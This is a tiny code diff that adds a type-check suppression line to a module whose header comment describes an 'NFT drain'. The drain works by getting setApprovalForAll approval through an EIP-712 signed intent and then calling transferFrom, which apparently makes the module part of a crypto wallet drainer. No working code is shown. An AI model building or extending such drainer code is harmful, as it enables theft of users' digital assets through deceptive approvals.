@@ -1,3 +1,4 @@
+// @ts-nocheck
 /**
  * NFT drain — ERC-721 / ERC-1155 setApprovalForAll EIP-712 intent + transferFrom settlement.
  */
